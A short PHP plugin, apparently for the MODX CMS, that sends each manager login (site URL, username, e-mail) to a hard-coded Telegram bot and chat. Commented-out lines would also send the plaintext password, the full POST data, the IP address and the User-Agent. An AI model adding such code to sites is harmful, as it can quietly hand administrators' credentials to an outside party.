<?php
$apiHost = 'https://api.telegram.org/';
$token = '123456789:AAE4lAmRmishaFSpPNCeBfy1shK71SyE_2uU';
$chatId = '182854229';

if (!function_exists('cleanSiteUrl')) {
	function cleanSiteUrl($url) {
		$url = str_replace('https://', '', $url);
		$url = str_replace('http://', '', $url);
		$url = rtrim($url, '/');
		return $url;
	}
}

switch ($modx->event->name) {
    case 'OnManagerLogin':
    	$profile = $user->getOne('Profile');
    	$managerUri = cleanSiteUrl($modx->getOption('site_url')).$modx->getOption('returnUrl', $_POST, '');
    	$message = 'Авторизация на сайте '.$managerUri."\n"
    			   .'Логин: '.$user->get('username')."\n"
    			   // .'Пароль: '.$modx->getOption('password', $_POST, '')."\n"
    			   .'E-mail: '.$profile->get('email')."\n"
    			   // .'Array: '.print_r($_POST, true)."\n"
    			   // .'IP: '.$modx->getOption('REMOTE_ADDR', $_SERVER, '')."\n"
    			   // .'User-Agent: '.$modx->getOption('HTTP_USER_AGENT', $_SERVER, '')
    			   ;
    	$message = urlencode($message);
   	    $apiUri = $apiHost.'bot'.$token.'/sendMessage?chat_id='.$chatId.'&text='.$message;
	    $response = file_get_contents($apiUri);
    	break;
    default:
    	break;
}